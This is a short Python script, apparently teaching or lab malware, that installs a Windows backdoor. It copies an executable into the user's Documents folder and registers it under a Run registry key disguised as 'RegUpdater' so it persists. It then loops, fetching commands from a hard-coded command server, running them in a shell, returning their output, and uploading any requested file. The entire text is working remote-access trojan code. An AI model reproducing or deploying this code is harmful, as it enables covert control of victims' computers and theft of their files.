#!/usr/bin/env python
# Filename: download_and_persist.py
# This program is optimized for Python 3.4
# Description: Applies rudimentary persistence method and phones home
#   counterpart: None

import requests
import os
import subprocess
import time
import shutil
import winreg as wreg

path = os.getcwd().strip('/n')
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')
destination = userprof.strip('\n\r') + '\\Documents\\' + 'sys32mal.exe'

if not os.path.exists(destination):
    shutil.copyfile(path+'\sys32mal.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()

while True:
    req = requests.get('http://192.168.0.50:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.50:8080/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.0.50:8080', data='[-] Not able to find the file!'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.50:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.50:8080', data=CMD.stderr.read())
    time.sleep(3)

